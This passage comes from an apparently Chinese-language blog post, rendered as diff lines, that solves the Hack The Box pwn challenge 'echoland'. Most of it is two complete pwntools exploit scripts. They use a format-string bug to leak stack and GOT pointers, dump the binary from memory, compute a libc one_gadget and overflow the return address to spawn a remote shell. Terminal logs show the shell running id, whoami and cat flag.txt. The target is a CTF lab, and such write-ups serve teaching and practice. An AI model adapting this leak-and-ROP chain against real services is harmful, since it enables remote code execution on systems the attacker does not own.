class="built_in">sleep</span>(1)</span><br><span class="line">            leak = p.recv()</span><br><span class="line">            x = str(i) + <span class="string">&quot; : &quot;</span> + leak.decode().<span class="built_in">split</span>(<span class="string">&quot;&gt;&quot;</span>)[1].<span class="built_in">split</span>(<span class="string">&quot;\x0a\x0a&quot;</span>)[0]</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            p.close()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak_pointers_from_stack(ip,port)</span></span><br><span class="line">def leak_pointer_to_main():</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;12th pointer is one from the main()&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    p.sendline(b<span class="string">&quot;%12<span class="variable">$p</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(1)</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    leak_all = p.recv()</span><br><span class="line">    leak = leak_all.decode().<span class="built_in">split</span>(<span class="string">&quot;\n&quot;</span>)[0]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Leaked main address: &quot;</span> + leak)</span><br><span class="line">    <span class="built_in">return</span> int(leak,16)</span><br><span class="line"></span><br><span class="line">def search_elf_magic_bytes(leaked_main,addr):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Search through the process memory to find ELF magic bytes: \x7fELF.&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        leak_part = b<span class="string">&quot;%9<span class="variable">$sEOF</span>&quot;</span> + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            p.sendline(leak_part + p64(leaked_main + addr))</span><br><span class="line">            resp = p.recvuntil(b<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">            leak = resp.split(b<span class="string">&quot;EOF&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Deferenced pointer: &quot;</span> + leak.decode(<span class="string">&quot;unicode_escape&quot;</span>))   </span><br><span class="line">            <span class="keyword">if</span> b<span class="string">&quot;\x7FELF&quot;</span> <span class="keyword">in</span> leak:</span><br><span class="line">                magic_bytes = leaked_main + addr</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;MAGIC BYTES FOUND @: &quot;</span> + hex(magic_bytes))</span><br><span class="line">                <span class="built_in">return</span> magic_bytes, False</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            addr -=0x100</span><br><span class="line">        except:</span><br><span class="line">            addr -=0x100</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">return</span> addr, True</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find ELF magic bytes =&gt; start_main_address</span></span><br><span class="line">elf_found=True</span><br><span class="line">addr = 0</span><br><span class="line">leaked_main = 0</span><br><span class="line"><span class="keyword">while</span> elf_found:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CURRENT ADDRESS = &quot;</span> + hex(addr))</span><br><span class="line">    leaked_main = leak_pointer_to_main() + addr</span><br><span class="line">    addr, elf_found = search_elf_magic_bytes(leaked_main,addr)</span><br><span class="line"></span><br><span class="line">start_main_addr = addr</span><br><span class="line"></span><br><span class="line">def dump_binary(magic_bytes_addr):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Dump the binary data&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    base = magic_bytes_addr</span><br><span class="line">    leak,leaked = bytearray(),bytearray()</span><br><span class="line">    offset = len(leaked)</span><br><span class="line">    <span class="keyword">while</span> offset &lt;= 0x5000:</span><br><span class="line">        with open(<span class="string">&quot;leak.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>) as l:</span><br><span class="line">            addr = p64(base + len(leaked))</span><br><span class="line">            leak_part = b<span class="string">&quot;%9<span class="variable">$sEOF</span>\x00&quot;</span></span><br><span class="line">            p.sendline(leak_part + addr)</span><br><span class="line">            resp = p.recvuntil(b<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">            leak = resp.split(b<span class="string">&quot;EOF&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">            leaked.extend(leak)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Address: &quot;</span> + hex(unpack(<span class="string">&quot;&lt;Q&quot;</span>,addr.ljust(8,b<span class="string">&quot;\x00&quot;</span>))[0]) + <span class="string">&quot; - Offset: &quot;</span> + str(offset) + <span class="string">&quot;:&quot;</span> + hex(offset)+ <span class="string">&quot; - Leaked data: &quot;</span> + leak.decode(<span class="string">&quot;unicode_escape&quot;</span>))</span><br><span class="line">            l.write(leak)</span><br><span class="line">            l.flush()</span><br><span class="line">            offset = len(leaked)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump binary:</span></span><br><span class="line"><span class="comment"># dump_binary(start_main_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># After reversing - 0x00003fa8</span></span><br><span class="line">def leak_printf_got(start_main_addr):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Leak printf@GOT - which is dynamically linked during runtime&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    printf_GOT = 0x00003fa8</span><br><span class="line">    printf_addr = start_main_addr + printf_GOT</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Leaked printf address: &quot;</span> + hex(printf_addr))</span><br><span class="line">    leak_part = b<span class="string">&quot;%9<span class="variable">$sEOF</span>\x00&quot;</span></span><br><span class="line">    p.sendline(leak_part + p64(printf_addr))</span><br><span class="line">    resp = p.recv()<span class="comment">#until(b&quot;1. Scream.\n2. Run outside.\n&gt; &quot;)</span></span><br><span class="line">    leak = resp.split(b<span class="string">&quot;EOF&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">    libc_printf = hex(u64(leak.ljust(8,b<span class="string">&quot;\x00&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!!!] Leaked libc printf : &quot;</span> + libc_printf)</span><br><span class="line">    <span class="built_in">return</span> int(libc_printf,16)</span><br><span class="line"></span><br><span class="line">libc_printf = leak_printf_got(start_main_addr)</span><br><span class="line"></span><br><span class="line">def fuzz_buffer_overflow(ip,port):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Find the offset of RIP overflow&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(30,100):</span><br><span class="line">        try:</span><br><span class="line">            p = remote(ip,port)</span><br><span class="line">            p.sendline(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            <span class="built_in">sleep</span>(1)</span><br><span class="line">            p.recv()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;FUZZING: &quot;</span> + str(i))</span><br><span class="line">            p.sendline(cyclic(i))</span><br><span class="line">            <span class="built_in">sleep</span>(1)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            <span class="built_in">print</span>(data.decode(<span class="string">&quot;unicode_escape&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> b<span class="string">&quot;Segmentation&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;========================\nBuffer overflow found @: &quot;</span> + str(i) + <span class="string">&quot;\n========================&quot;</span>)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            p.close()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"><span class="comment">#fuzz_buffer_overflow(ip,port)</span></span><br><span class="line"></span><br><span class="line">def get_rce(libc_printf):</span><br><span class="line">    printf_libc_offset = 0x0000000000064f70</span><br><span class="line">    one_gadget = 0x4f432</span><br><span class="line">    rce = libc_printf - printf_libc_offset + one_gadget</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CALCULATED RCE: &quot;</span> + hex(rce))</span><br><span class="line">    p.sendline(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(b<span class="string">&quot;A&quot;</span>*64 +p64(0x0000000000064f70) + p64(rce) + b<span class="string">&quot;\x00&quot;</span>*0x70)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">get_rce(libc_printf)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># python3 dumpbinary.py </span></span><br><span class="line">CURRENT ADDRESS = 0x0</span><br><span class="line">Leaked main address: 0x561281687400</span><br><span class="line">Deferenced pointer: ó\x0fúAWL=k)\x00</span><br><span class="line">Deferenced pointer: uÐèYÿÿÿÇEü\x00</span><br><span class="line">Deferenced pointer: ó\x0fú=\x1d\x00</span><br><span class="line">Deferenced pointer: ó\x0fúòÿ%.\x00</span><br><span class="line">Deferenced pointer: ó\x0fúHH\x05\x99/\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: ð?\x00</span><br><span class="line">Deferenced pointer: ble\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x04</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x7fELF\x00</span><br><span class="line">MAGIC BYTES FOUND @: 0x561281686000</span><br><span class="line">Leaked <span class="built_in">printf</span> address: 0x561281689fa8</span><br><span class="line">[!!!] Leaked libc <span class="built_in">printf</span> : 0x7f1f0dabcf70</span><br><span class="line">CALCULATED RCE: 0x7f1f0daa7432</span><br><span class="line">&gt;&gt; $ <span class="built_in">id</span></span><br><span class="line">uid=999(ctf) gid=999(ctf) <span class="built_in">groups</span>=999(ctf)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">echoland</span><br><span class="line">flag.txt</span><br><span class="line">libc.so.6</span><br><span class="line">run_challenge.sh</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">HTB&#123;bl1nd_R0p_1s_c0ol_a1nt_1t?&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland10.jpg"></li>
+</ul>
+<p>other exp script:</p>
+<ul>
+<li>getshell.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">import struct</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;138.68.129.154&quot;</span></span><br><span class="line">port=31898</span><br><span class="line"></span><br><span class="line">def search(addr):</span><br><span class="line">    <span class="comment"># p = remote(args.srv, args.port)</span></span><br><span class="line">    <span class="comment"># rec = p.recvuntil(&quot;&gt; &quot;)</span></span><br><span class="line">    <span class="comment"># print(rec)</span></span><br><span class="line">    p.sendline(b<span class="string">&quot;%9<span class="variable">$s___</span>&quot;</span> + b<span class="string">&quot;\x00&quot;</span> + p64(addr))</span><br><span class="line">    rec = p.recvuntil(<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">    <span class="comment"># print(rec)</span></span><br><span class="line">    <span class="comment"># p.close()</span></span><br><span class="line">    <span class="built_in">return</span> rec.split(b<span class="string">&quot;___&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">def searchelf(addr):</span><br><span class="line">    <span class="comment"># p = remote(args.srv, args.port)</span></span><br><span class="line">    <span class="comment"># rec = p.recvuntil(&quot;&gt; &quot;)</span></span><br><span class="line">    <span class="comment"># print(rec)</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        p.sendline(b<span class="string">&quot;%9<span class="variable">$s___</span>&quot;</span> + b<span class="string">&quot;\x00&quot;</span> + p64(addr))</span><br><span class="line">        rec = p.recvuntil(<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(rec)</span><br><span class="line">        <span class="keyword">if</span> rec.split(b<span class="string">&quot;___&quot;</span>)[0].startswith(<span class="string">&quot;\x7FELF&quot;</span>):</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        addr -= 0x1000</span><br><span class="line">    <span class="comment"># print(rec)</span></span><br><span class="line">    <span class="comment"># p.close()</span></span><br><span class="line">    <span class="built_in">return</span> addr</span><br><span class="line"></span><br><span class="line">def get_qword(addr):</span><br><span class="line">    data = b<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(data) &lt; 8:</span><br><span class="line">        p.sendline(b<span class="string">&quot;%9<span class="variable">$s___</span>&quot;</span> + b<span class="string">&quot;\x00&quot;</span> + p64(addr))</span><br><span class="line">        rec = p.recvuntil(<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">        data += rec.split(b<span class="string">&quot;___&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    data = data[:8]</span><br><span class="line">    <span class="built_in">return</span> u64(data)</span><br><span class="line"></span><br><span class="line">def stackleak():</span><br><span class="line">    <span class="comment"># p = remote(args.srv, args.port)</span></span><br><span class="line">    rec = p.recvuntil(b<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="comment"># print(rec)</span></span><br><span class="line">    idx = 2</span><br><span class="line">    addrs = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> idx &lt; 64:</span><br><span class="line">        p.sendline(<span class="string">&quot;%&#123;&#125;<span class="variable">$p</span>&quot;</span>.format(idx))</span><br><span class="line">        rec = p.recvuntil(b<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">        <span class="comment"># print(rec)</span></span><br><span class="line">        addrs[idx] = rec.split(b<span class="string">&quot;\n&quot;</span>)[0]</span><br><span class="line">        idx += 1</span><br><span class="line">    <span class="built_in">print</span>(addrs)</span><br><span class="line">    <span class="comment"># p.close()</span></span><br><span class="line">    <span class="built_in">return</span> addrs[12], addrs[13] <span class="comment"># main, libc</span></span><br><span class="line"> </span><br><span class="line">p = remote(host, port)</span><br><span class="line">main_addr, libc_addr = stackleak()</span><br><span class="line">main_elf = int(main_addr, 16) - 0x1400</span><br><span class="line">libc_elf = int(libc_addr, 16) - 0x21BF7 </span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;addr &#123;&#125; elf &#123;&#125;&quot;.format(libc_addr, hex(searchelf(libc_elf))))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot; code to copy the entire executable from the memory</span></span><br><span class="line"><span class="string">offset = 0</span></span><br><span class="line"><span class="string">f = open(&quot;</span>elf2<span class="string">&quot;, &quot;</span>a<span class="string">&quot;)</span></span><br><span class="line"><span class="string">while offset &lt; 0x6000:</span></span><br><span class="line"><span class="string">    data = search(addr + offset)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    print(&quot;</span>&#123;&#125; &#123;&#125;<span class="string">&quot;.format(offset, data))</span></span><br><span class="line"><span class="string">    offset += len(data)</span></span><br><span class="line"><span class="string">    f.write(data)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">printf_got_offset = 0x3fa8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc &#123;&#125;&quot;</span>.format(hex(libc_elf)))</span><br><span class="line">printf_address = get_qword(main_elf + printf_got_offset)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;printf address &#123;&#125;&quot;</span>.format(hex(printf_address)))</span><br><span class="line">binsh_offset = 0x1b3e1a</span><br><span class="line">binsh_address = libc_elf + binsh_offset</span><br><span class="line"><span class="built_in">print</span>(search(binsh_address))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;printf address &#123;&#125;&quot;</span>.format(hex(printf_address)))</span><br><span class="line">one_gadget_offset = 0x4f432</span><br><span class="line">one_gadget_address = libc_elf + one_gadget_offset</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(p64(one_gadget_address) * 11 + b<span class="string">&quot;\x00&quot;</span> * 0x40)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># python3 getshell.py                                                                                        </span></span><br><span class="line">[+] Opening connection to 138.68.129.154 on port 31898: Done</span><br><span class="line">/root/hackthebox/challenge/pwn/echoland/getshell.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  p.sendline(<span class="string">&quot;%&#123;&#125;<span class="variable">$p</span>&quot;</span>.format(idx))</span><br><span class="line">&#123;2: b<span class="string">&#x27;0xfffffff4&#x27;</span>, 3: b<span class="string">&#x27;(nil)&#x27;</span>, 4: b<span class="string">&#x27;0x1d&#x27;</span>, 5: b<span class="string">&#x27;0x7f0fe1ae44c0&#x27;</span>, 6: b<span class="string">&#x27;0x7ffdeffc7288&#x27;</span>, 7: b<span class="string">&#x27;0x100000000&#x27;</span>, 8: b<span class="string">&#x27;0xa70243825&#x27;</span>, 9: b<span class="string">&#x27;(nil)&#x27;</span>, 10: b<span class="string">&#x27;0x7ffd00000000&#x27;</span>, 11: b<span class="string">&#x27;0x100000000&#x27;</span>, 12: b<span class="string">&#x27;0x55a94d2d0400&#x27;</span>, 13: b<span class="string">&#x27;0x7f0fe14efbf7&#x27;</span>, 14: b<span class="string">&#x27;0x1&#x27;</span>, 15: b<span class="string">&#x27;0x7ffdeffc7288&#x27;</span>, 16: b<span class="string">&#x27;0x100008000&#x27;</span>, 17: b<span class="string">&#x27;0x55a94d2d02ef&#x27;</span>, 18: b<span class="string">&#x27;(nil)&#x27;</span>, 19: b<span class="string">&#x27;0xa9482bc8c760734e&#x27;</span>, 20: b<span class="string">&#x27;0x55a94d2d0160&#x27;</span>, 21: b<span class="string">&#x27;0x7ffdeffc7280&#x27;</span>, 22: b<span class="string">&#x27;(nil)&#x27;</span>, 23: b<span class="string">&#x27;(nil)&#x27;</span>, 24: b<span class="string">&#x27;0xfde16e6a2c00734e&#x27;</span>, 25: b<span class="string">&#x27;0xfc05730f383e734e&#x27;</span>, 26: b<span class="string">&#x27;0x7ffd00000000&#x27;</span>, 27: b<span class="string">&#x27;(nil)&#x27;</span>, 28: b<span class="string">&#x27;(nil)&#x27;</span>, 29: b<span class="string">&#x27;0x7f0fe18cf8d3&#x27;</span>, 30: b<span class="string">&#x27;0x7f0fe18b5638&#x27;</span>, 31: b<span class="string">&#x27;0x7f72e&#x27;</span>, 32: b<span class="string">&#x27;(nil)&#x27;</span>, 33: b<span class="string">&#x27;(nil)&#x27;</span>, 34: b<span class="string">&#x27;(nil)&#x27;</span>, 35: b<span class="string">&#x27;0x55a94d2d0160&#x27;</span>, 36: b<span class="string">&#x27;0x7ffdeffc7280&#x27;</span>, 37: b<span class="string">&#x27;0x55a94d2d018e&#x27;</span>, 38: b<span class="string">&#x27;0x7ffdeffc7278&#x27;</span>, 39: b<span class="string">&#x27;0x1c&#x27;</span>, 40: b<span class="string">&#x27;0x1&#x27;</span>, 41: b<span class="string">&#x27;0x7ffdeffc8ea6&#x27;</span>, 42: b<span class="string">&#x27;(nil)&#x27;</span>, 43: b<span class="string">&#x27;0x7ffdeffc8eb1&#x27;</span>, 44: b<span class="string">&#x27;0x7ffdeffc8eb9&#x27;</span>, 45: b<span class="string">&#x27;0x7ffdeffc8ec9&#x27;</span>, 46: b<span class="string">&#x27;0x7ffdeffc8ed3&#x27;</span>, 47: b<span class="string">&#x27;0x7ffdeffc8ee0&#x27;</span>, 48: b<span class="string">&#x27;0x7ffdeffc8ee6&#x27;</span>, 49: b<span class="string">&#x27;0x7ffdeffc8eef&#x27;</span>, 50: b<span class="string">&#x27;0x7ffdeffc8efb&#x27;</span>, 51: b<span class="string">&#x27;0x7ffdeffc8f09&#x27;</span>, 52: b<span class="string">&#x27;0x7ffdeffc8f13&#x27;</span>, 53: b<span class="string">&#x27;0x7ffdeffc8f1f&#x27;</span>, 54: b<span class="string">&#x27;0x7ffdeffc8f2b&#x27;</span>, 55: b<span class="string">&#x27;0x7ffdeffc8f31&#x27;</span>, 56: b<span class="string">&#x27;0x7ffdeffc8f4c&#x27;</span>, 57: b<span class="string">&#x27;0x7ffdeffc8f59&#x27;</span>, 58: b<span class="string">&#x27;0x7ffdeffc8f61&#x27;</span>, 59: b<span class="string">&#x27;0x7ffdeffc8f6b&#x27;</span>, 60: b<span class="string">&#x27;0x7ffdeffc8f79&#x27;</span>, 61: b<span class="string">&#x27;0x7ffdeffc8fbb&#x27;</span>, 62: b<span class="string">&#x27;0x7ffdeffc8fce&#x27;</span>, 63: b<span class="string">&#x27;0x7ffdeffc8fd7&#x27;</span>&#125;</span><br><span class="line">libc 0x7f0fe14ce000</span><br><span class="line">/root/hackthebox/challenge/pwn/echoland/getshell.py:41: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  rec = p.recvuntil(<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">printf</span> address 0x70007f0fe1532f70</span><br><span class="line">/root/hackthebox/challenge/pwn/echoland/getshell.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  rec = p.recvuntil(<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">b<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="built_in">printf</span> address 0x70007f0fe1532f70</span><br><span class="line">/root/hackthebox/challenge/pwn/echoland/getshell.py:94: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">/root/hackthebox/challenge/pwn/echoland/getshell.py:95: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=999(ctf) gid=999(ctf) <span class="built_in">groups</span>=999(ctf)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">HTB&#123;bl1nd_R0p_1s_c0ol_a1nt_1t?&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland11.jpg"></li>
+</ul>
+<h2 id="摘自-致敬原作-……"><a href="#摘自-致敬原作-……" class="headerlink" title="摘自(致敬原作)……"></a>摘自(致敬原作)……</h2><ul>
+<li>浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。</li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9rYXJvbC1tYXp1cmVrOTUubWVkaXVtLmNvbS9wd24tZWNob2xhbmQtY2hhbGxlbmdlLWh0Yi0zMzYzZGJkNmRjMjM=">PWN Echoland challenge — HTB<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/12/11/echoland/" title="Hack-The-Box-pwn-challenge[echoland]">https://fdlucifer.github.io/2021/12/11/echoland/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
